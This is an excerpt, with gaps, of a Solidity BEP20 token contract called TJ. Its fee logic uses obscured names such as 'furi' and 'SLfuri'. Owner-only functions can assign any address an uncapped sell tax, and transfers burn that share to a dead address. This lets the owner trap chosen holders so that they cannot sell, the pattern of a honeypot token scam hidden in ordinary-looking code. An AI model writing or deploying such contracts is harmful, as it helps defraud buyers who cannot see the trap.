 ...
 *
 * This module is used through inheritance. It will make available the modifurir
...
contract TJ is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfuri = 4;

    uint256 private _defaultBuyfuri = 0;


    mapping(address => bool) private _marketacounts;

    mapping(address => uint256) private _SLfuri;
    ...
    function upslf(uint256 _value) external onlyowner {
        _defaultSellfuri = _value;
    }


    function setSLfuri(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "acounts tax must be greater than or equal to 1");
        _SLfuri[_address] = _value;
    }

    function getSLfuri(address _address) external view onlyowner returns (uint256) {
        return _SLfuri[_address];
    }


    function setMarketacountsfuri(address _address, bool _value) external onlyowner {
        _marketacounts[_address] = _value;
    }

    function getMarketacountsfuri(address _address) external view onlyowner returns (bool) {
     ...
     * e.g. implement automatic token furis, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (recipient == uniswapV2Pair) {
                    ...
                    tradefuri = _defaultSellfuri;
                }
                if (sender == uniswapV2Pair) {

                    tradefuri = _defaultBuyfuri;
                }
            }
            if (_SLfuri[sender] > 0) {
                tradefuri = _SLfuri[sender];
            }

            tradefuriAmount = amount.mul(tradefuri).div(100);
        }


        if (tradefuriAmount > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefuriAmount);
            emit Transfer(sender, _DEADaddress, tradefuriAmount);
        }
        _balances[recipient] = _balances[recipient].add(amount - tradefuriAmount);
        emit Transfer(sender, recipient, amount - tradefuriAmount);
    }
